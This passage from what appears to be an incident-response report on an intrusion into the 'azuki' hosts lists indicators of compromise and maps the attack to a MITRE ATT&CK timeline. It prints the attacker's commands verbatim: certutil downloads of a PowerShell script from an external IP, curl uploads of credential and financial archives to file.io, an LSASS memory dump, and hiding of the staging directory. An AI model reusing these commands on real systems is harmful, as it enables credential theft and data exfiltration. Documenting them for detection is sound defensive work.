|      Port      |                                                                                                                                                             7331, 8080                                                                                                                                                             |               Ports used to download malicious PowerShell script               |
|   Host Name    |                                                                                                                                                              azuki-sl                                                                                                                                                              |                   System initially accessed by threat actor                    |
|   Host Name    |                                                                                                                                                         azuki-fileserver01                                                                                                                                                         |          Internal file server compromised via lateral movement (RDP)           |
|  User Account  |                                                                                                                                                             kenji.sato                                                                                                                                                             |                      User account with stolen credentials                      |
|  User Account  |                                                                                                                                                             fileadmin                                                                                                                                                              |               Privileged account used for exploitation activity                |
|   File Path    |                                                                                                                                                        C:\Windows\Logs\CBS                                                                                                                                                         |              Hidden directory used for staging data and executing              |
|   File Path    |                                                                                                                                                        C:\Windows\System32\                                                                                                                                                        |          System directory used to host persistence PowerShell script           |
|    Command     |                                                                                                                                              `"attrib.exe" +h +s C:\Windows\Logs\CBS`                                                                                                                                              |                         Used to hide staging directory                         |
|    Command     |                                                                                             `certutil.exe -urlcache -f http[://]78[.]141[.]196[.]6:8080/ex.ps1`<br>`certutil.exe -urlcache -f http[://]78[.]141[.]196[.]6:7331/ex.ps1`                                                                                             |              Command used to download malicious PowerShell script              |
|    Command     | `xcopy.exe C:\FileShares\Contracts C:\Windows\Logs\CBS\contracts /E /I /H /Y` <br> `xcopy.exe C:\FileShares\Financial C:\Windows\Logs\CBS\financial /E /I /H /Y` <br> `xcopy.exe C:\FileShares\IT-Admin C:\Windows\Logs\CBS\it-admin /E /I /H /Y` <br> `xcopy.exe C:\FileShares\Shipping C:\Windows\Logs\CBS\shipping /E /I /H /Y` | Command used to recursively copy files from network share to staging direcotry |
|    Command     |  `"curl.exe" -F file=@C:\Windows\Logs\CBS\credentials.tar.gz https://file[.]io` <br> `"curl.exe" -F file=@C:\Windows\Logs\CBS\financial.tar.gz https://file[.]io` <br> `"curl.exe" -F file=@C:\Windows\Logs\CBS\contracts.zip https://file[.]io` <br> `"curl.exe" -F file=@C:\Windows\Logs\CBS\shipping.tar.gz https://file[.]io`  |     Command used to exfiltrate staged archives to external clouds service      |
|    Command     |                                                                                                                                    `"pd.exe" -accepteula -ma 876 C:\Windows\Logs\CBS\lsass.dmp`                                                                                                                                    |                       Command used to dump LSASS memory                        |
|      URL       |                                                                                                                              hxxp[://]78[.]141[.]196[.]6[:]8080<br>hxxp[://]78[.]141[.]196[.]6[:]7331                                                                                                                              |                URL used to download malicious powershell script                |
|      URL       |                                                                                                                                                       `hxxps[://]file[.]io]`                                                                                                                                                       |            External cloud service used to receive exfiltrated data             |
|      File      |                                                                                                                                                               ex.ps1                                                                                                                                                               |                     Downloaded malicious PowerShell script                     |
|      File      |                                                                                                                                                      IT-Admin-Passwordws.csv                                                                                                                                                       |                   Credential file staged from network share                    |
|      File      |                                                                                                                            credentials.tar.gz<br>financial.tar.gz <br>contracts.zip <br>shipping.tar.gz                                                                                                                            |               Compressed archives prepared for data exfiltration               |
|      File      |                                                                                                                                                             lsass.dmp                                                                                                                                                              |           LSASS process memory dump containing plaintext credentials           |
|      File      |                                                                                                                                                               pd.exe                                                                                                                                                               |                         Tool used to dump LSASS memory                         |
|      File      |                                                                                                                                                            svchost.ps1                                                                                                                                                             |                   Masqueraded PowerShell persistence script                    |
|      File      |                                                                                                                                                      ConsoleHost_history.txt                                                                                                                                                       |               PowerShell history file deleted for anti-forensics               |
|  Registry Key  |                                                                                                                                         HKLM\Software\Microsoft\Windows\CurrentVersion\Run                                                                                                                                         |                    Registry run key abused for persistence                     |
| Registry Value |                                                                                                                                                           FileShareSync                                                                                                                                                            |      Autorun value executing masqueraded PowerShell script `svchost.ps1`       |

## Appendix B: MITRE ATT&CK  Mapping

|   **Time (UTC)**    |                               **Activity**                               |     **Tactic**      | **Technique ID** |           **Technique Name**           |
| :-----------------: | :----------------------------------------------------------------------: | :-----------------: | :--------------: | :------------------------------------: |
| 2025-11-22T00:27:53 |             External authentication using stolen credentials             |   Initial Access    |      T1078       |             Valid Accounts             |
| 2025-11-22T00:38:49 |        Unauthorized access to administrator acccount `fileadmin`         |  Lateral Movement   |      T1078       |             Valid Accounts             |
| 2025-11-22T00:38:57 |           RDP access to internal file server using `mstsc.exe`           |  Lateral Movement   |    T1021.001     |        Remote Desktop Protocol         |
| 2025-11-22T00:40:54 |       Local network share enumeration `net.exe share enumeartion`        |      Discovery      |      T1135       |        Network Share Discovery         |
| 2025-11-22T00:42:01 |       Remote network share enumeration `net.exe view \\10.1.0.188`       |      Discovery      |      T1135       |        Network Share Discovery         |
| 2025-11-22T00:42:24 |             User privilege enumeration<br>`whoami.exe /all`              |      Discovery      |      T1087       |           Account Discovery            |
| 2025-11-22T00:42:46 |           Network configuration discovery `ipconfig.exe /all`            |      Discovery      |      T1016       | System Network Configuration Discovery |
| 2025-11-22T00:55:43 |       Staging directory created and hidden<br> `attrib.exe +h +s`        |   Defense Evasion   |    T1564.001     |      Hidden Files and Directories      |
| 2025-11-22T00:56:47 |             PowerShell script downloaded via `certutil.exe`              | Command and Control |      T1105       |         Ingress Tool Transfer          |
| 2025-11-22T01:07:53 | Recursive copy of sensitive files to staging directory using `xcopy.exe` |     Collection      |      T1039       |     Data from Network Shared Drive     |
| 2025-11-22T01:07:53 |           `IT-Admin-Passwords.csv` copied to staging dierctory           | Credentials Access  |    T1552.001     |          Credentials in Files          |
| 2025-11-22T01:30:10 |                  Staged data compressed using `tar.exe`                  |     Collection      |    T1560.001     |          Archive via Utility           |
| 2025-11-22T01:59:54 |     Data exfiltrated to cloud file-sharing service using `curl.exe`      |    Exfiltration     |    T1567.002     |     Exfiltration to Cloud Storage      |
| 2025-11-22T02:10:50 |         Registry Run key `FileShareSync` created for persistence         |     Persistence     |    T1547.001     |   Registry Run Keys / Startup Folder   |
| 2025-11-22T02:10:50 |                        `svchost.ps1` masquerading                        |   Defense Evasion   |      T1036       |              Masquerading              |
| 2025-11-22T02:24:47 |                     LSASS memory dumped `lsasss.dmp`                     |  Credential Access  |    T1003.001     |              LSASS Memory              |
| 2025-11-22T02:25:37 |                 LSASS dump exfiltrated using `curl.exe`                  |    Exfiltration     |    T1567.002     |     Exfiltration to Cloud Storage      |
| 2025-11-22T02:26:01 |                     PowerShell history file deleted                      |   Defense Evasion   |      T1070       |       Indicator Removal on Host        |
